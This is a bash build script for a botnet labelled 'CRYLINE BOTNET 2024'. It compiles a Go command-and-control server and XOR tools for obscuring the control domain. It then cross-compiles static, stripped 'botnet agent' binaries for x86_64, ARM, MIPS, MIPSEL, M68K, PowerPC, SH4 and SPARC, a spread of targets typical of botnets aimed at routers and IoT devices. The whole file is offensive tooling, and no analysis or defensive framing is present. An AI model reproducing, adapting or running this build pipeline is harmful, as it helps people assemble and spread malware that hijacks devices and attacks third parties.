#!/bin/bash

clear

echo ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"

echo " "

echo "[*] Clearing old files..."
rm /BOTNET/SOURCE/BUILD/*

echo "[*] Compilng CNC..."
cd /BOTNET/SOURCE/CNC
/BOTNET/COMPILERS/go/bin/go build -o ../BUILD/CNC_SERVER /BOTNET/SOURCE/CNC/*.go

echo "[*] Compilng Tools..."
cd /BOTNET/SOURCE/TOOLS
gcc XOR_ENCRYPT_CNC_DOMAIN.c -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/XOR_ENCRYPT_CNC_DOMAIN
gcc XOR_ENCRYPTION_KEYGEN.c -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/XOR_ENCRYPTION_KEYGEN
strip /BOTNET/SOURCE/BUILD/XOR_ENCRYPT_CNC_DOMAIN -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
strip /BOTNET/SOURCE/BUILD/XOR_ENCRYPTION_KEYGEN -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

cd /BOTNET/SOURCE/BOTNET_AGENT

echo "[*] Compiling botnet agent for x86_64 architecture..."
gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/x86_64
strip /BOTNET/SOURCE/BUILD/x86_64 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for ARM x32 architecture..."
arm-linux-gnueabi-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/ARMx32
arm-linux-gnueabi-strip /BOTNET/SOURCE/BUILD/ARMx32 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for ARM x64 architecture..."
aarch64-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/ARMx64
aarch64-linux-gnu-strip /BOTNET/SOURCE/BUILD/ARMx64 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for MIPS architecture..."
mips-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/MIPS
mips-linux-gnu-strip /BOTNET/SOURCE/BUILD/MIPS -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for MIPSEL architecture..."
mipsel-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/MIPSEL
mipsel-linux-gnu-strip /BOTNET/SOURCE/BUILD/MIPSEL -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for I686 architecture..."
i686-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/I686
i686-linux-gnu-strip /BOTNET/SOURCE/BUILD/I686 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for M68K architecture..."
m68k-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/M68K
m68k-linux-gnu-strip /BOTNET/SOURCE/BUILD/M68K -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for POWERPC architecture..."
powerpc-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/POWERPC
powerpc-linux-gnu-strip /BOTNET/SOURCE/BUILD/POWERPC -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for SH4 architecture..."
sh4-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/SH4
sh4-linux-gnu-strip /BOTNET/SOURCE/BUILD/SH4 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[*] Compiling botnet agent for SPARC architecture..."
sparc64-linux-gnu-gcc -std=c99 -static /BOTNET/SOURCE/BOTNET_AGENT/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /BOTNET/SOURCE/BUILD/SPARC
sparc64-linux-gnu-strip /BOTNET/SOURCE/BUILD/SPARC -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "[+] BOTNET SUCCESS BUILDED!"

exit